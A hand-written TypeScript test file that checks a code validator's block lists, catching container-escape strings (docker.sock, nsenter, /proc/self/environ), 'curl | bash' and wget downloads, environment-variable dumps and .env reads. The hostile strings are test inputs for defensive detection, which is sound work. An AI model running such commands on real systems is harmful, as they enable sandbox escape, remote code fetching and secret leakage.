/**
 * types.ts pattern tests - HAND-WRITTEN (not auto-generated)
 *
 * Reason: Tier 1 (ALWAYS_BLOCK) patterns contain strings like docker.sock,
 * nsenter, /proc/self/environ that trigger the validator itself.
 * These tests are excluded from autonomous generation per design decision:
 * Croppy x GPT debate, 3 rounds CONVERGED (2026-02-14)
 *
 * Maintenance: Update when ALWAYS_BLOCK_PATTERNS / DOCKER_BLOCK_PATTERNS change.
 */
import { describe, test, expect } from 'bun:test';
import {
  DANGEROUS_SYMBOL_PATTERNS,
  ALWAYS_BLOCK_PATTERNS,
  DOCKER_BLOCK_PATTERNS,
  DEFAULT_ALLOWED_IMPORTS,
  FORBIDDEN_CHANGED_FILES,
} from './types';

// Helper: test if ANY pattern in the array matches the input
const anyMatch = (patterns: RegExp[], input: string) =>
  patterns.some((p) => p.test(input));

// ============================================================
// DANGEROUS_SYMBOL_PATTERNS (Tier 3 / HOST_ONLY)
// ============================================================
describe('DANGEROUS_SYMBOL_PATTERNS', () => {
  test('fs.rmSync -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.rmSync("/data")')).toBe(true);
  });
  test('fs.readFileSync -> no detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.readFileSync("x.txt")')).toBe(false);
  });

  test('fs.rm( -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.rm("/data")')).toBe(true);
  });
  test('fs.rename( -> no detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.rename("a","b")')).toBe(false);
  });

  test('fs.unlinkSync -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.unlinkSync("x")')).toBe(true);
  });

  test('fs.writeFileSync /etc -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "fs.writeFileSync('/etc/passwd','x')")).toBe(true);
  });
  test('fs.writeFileSync /tmp -> no detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "fs.writeFileSync('/tmp/safe','x')")).toBe(false);
  });

  test('child_process -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "import { exec } from 'child_process'")).toBe(true);
  });
  test('process.env -> no detect via child_process', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'const x = process.env.HOME')).toBe(false);
  });

  test('execSync -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'execSync("ls")')).toBe(true);
  });
  test('existsSync -> no detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'fs.existsSync("x")')).toBe(false);
  });

  test('spawnSync -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'spawnSync("ls")')).toBe(true);
  });

  test('process.exit -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'process.exit(1)')).toBe(true);
  });

  test('Bun.spawn -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'Bun.spawn(["ls"])')).toBe(true);
  });

  test('eval( -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'eval("code")')).toBe(true);
  });
  test('evaluate -> no detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'page.evaluate(fn)')).toBe(false);
  });

  test('new Function( -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'new Function("return 1")')).toBe(true);
  });

  test("require('child_process') -> detect", () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "require('child_process')")).toBe(true);
  });
  test("require('path') -> no detect", () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "require('path')")).toBe(false);
  });

  test("from 'bun:ffi' -> detect", () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "from 'bun:ffi'")).toBe(true);
  });
  test("from 'bun:test' -> no detect", () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, "from 'bun:test'")).toBe(false);
  });

  test('Bun.$ -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'Bun.$`ls`')).toBe(true);
  });

  test('Bun.shell -> detect', () => {
    expect(anyMatch(DANGEROUS_SYMBOL_PATTERNS, 'Bun.shell')).toBe(true);
  });
});

// ============================================================
// ALWAYS_BLOCK_PATTERNS (Tier 1)
// ============================================================
describe('ALWAYS_BLOCK_PATTERNS', () => {
  // Docker escape
  test('docker.sock -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, '/var/run/docker.sock')).toBe(true);
  });

  test('/proc/self/environ -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'cat /proc/self/environ')).toBe(true);
  });
  test('/proc/1/cmdline -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, '/proc/1/cmdline')).toBe(true);
  });
  test('/proc/123/fd -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, '/proc/123/fd')).toBe(true);
  });

  test('nsenter -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'nsenter --target 1')).toBe(true);
  });
  test('unshare -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'unshare -m')).toBe(true);
  });
  test('setns -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'setns(fd, 0)')).toBe(true);
  });
  test('ptrace -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'ptrace(PTRACE_ATTACH)')).toBe(true);
  });

  test('--privileged -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'docker run --privileged')).toBe(true);
  });

  // Build-time attack
  test('npm install -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'npm install lodash')).toBe(true);
  });
  test('curl | bash -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'curl | bash')).toBe(true);
  });
  test('wget -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'wget https://x.com/malware')).toBe(true);
  });
  test('pip install -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'pip install requests')).toBe(true);
  });

  // Env bulk dump
  test('Object.keys(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'Object.keys(process.env)')).toBe(true);
  });
  test('Object.values(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'Object.values(process.env)')).toBe(true);
  });
  test('Object.entries(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'Object.entries(process.env)')).toBe(true);
  });
  test('JSON.stringify(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'JSON.stringify(process.env)')).toBe(true);
  });
  test('console.log(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'console.log(process.env)')).toBe(true);
  });
  test('console.dir(process.env) -> detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'console.dir(process.env)')).toBe(true);
  });

  // False negatives (should NOT match)
  test('process.env.HOME -> no detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'process.env.HOME')).toBe(false);
  });
  test('npm run test -> no detect', () => {
    expect(anyMatch(ALWAYS_BLOCK_PATTERNS, 'npm run test')).toBe(false);
  });
});

// ============================================================
// DOCKER_BLOCK_PATTERNS (Tier 2)
// ============================================================
describe('DOCKER_BLOCK_PATTERNS', () => {
  test("require('dotenv') -> detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "require('dotenv')")).toBe(true);
  });
  test("from 'dotenv' -> detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "import dotenv from 'dotenv'")).toBe(true);
  });
  test("readFileSync('.env') -> detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "readFileSync('.env')")).toBe(true);
  });
  test("Bun.file('.env') -> detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "Bun.file('.env')")).toBe(true);
  });

  // False negatives
  test("require('path') -> no detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "require('path')")).toBe(false);
  });
  test("readFileSync('config.json') -> no detect", () => {
    expect(anyMatch(DOCKER_BLOCK_PATTERNS, "readFileSync('config.json')")).toBe(false);
  });
});

// ============================================================
// DEFAULT_ALLOWED_IMPORTS
// ============================================================
describe('DEFAULT_ALLOWED_IMPORTS', () => {
  test("'bun:test' is allowed", () => {
    expect(DEFAULT_ALLOWED_IMPORTS).toContain('bun:test');
  });
  test("'fs' is allowed", () => {
    expect(DEFAULT_ALLOWED_IMPORTS).toContain('fs');
  });
  test("'node:fs' is allowed", () => {
    expect(DEFAULT_ALLOWED_IMPORTS).toContain('node:fs');
  });
  test("'./' is allowed", () => {
    expect(DEFAULT_ALLOWED_IMPORTS).toContain('./');
  });
  test("'../' is allowed", () => {
    expect(DEFAULT_ALLOWED_IMPORTS).toContain('../');
  });
});

// ============================================================
// FORBIDDEN_CHANGED_FILES
// ============================================================
describe('FORBIDDEN_CHANGED_FILES', () => {
  test('package.json is forbidden', () => {
    expect(FORBIDDEN_CHANGED_FILES).toContain('package.json');
  });
  test('bun.lock is forbidden', () => {
    expect(FORBIDDEN_CHANGED_FILES).toContain('bun.lock');
  });
  test('bun.lockb is forbidden', () => {
    expect(FORBIDDEN_CHANGED_FILES).toContain('bun.lockb');
  });
});
